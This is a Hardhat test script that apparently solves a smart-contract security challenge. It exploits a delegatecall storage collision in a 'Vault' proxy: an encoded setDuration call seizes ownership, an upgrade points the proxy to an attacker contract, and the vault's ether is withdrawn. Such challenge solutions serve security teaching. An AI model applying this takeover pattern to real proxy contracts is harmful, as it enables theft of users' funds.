import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('Vault', () => {
  let implementation: Contract;
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    implementation = await (await ethers.getContractFactory('Vesting', deployer)).deploy();

    await implementation.deployed();

    target = await (
      await ethers.getContractFactory('Vault', deployer)
    ).deploy(implementation.address);

    target = target.connect(attacker);

    await (
      await deployer.sendTransaction({
        to: target.address,
        value: ethers.utils.parseEther('0.2'),
      })
    ).wait();
  });

  it('attack', async () => {
    const newImplementationFactory = await ethers.getContractFactory(
      'VaultNewImplementation',
      attacker
    );
    const newImplementation = await newImplementationFactory.deploy();

    await newImplementation.deployed();

    // 1 - call execute, execute will call the contract starting a delegation to the implementation and calling setDuration and setting it with attacker.address
    const iface = new ethers.utils.Interface(['function setDuration(uint256)']);

    const setDurationData = iface.encodeFunctionData('setDuration', [attacker.address]);

    await (await target.execute(target.address, setDurationData)).wait();

    expect(await target.owner()).to.equal(attacker.address);

    // 2 - call upgradeDelegate deploying a new implementation with a withdraw function
    await (await target.upgradeDelegate(newImplementation.address)).wait();

    // 3 - call implementation.widthdraw and get the ether
    await (await newImplementationFactory.attach(target.address).withdraw()).wait();

    expect((await ethers.provider.getBalance(target.address)).eq(0)).to.be.true;
  });
});
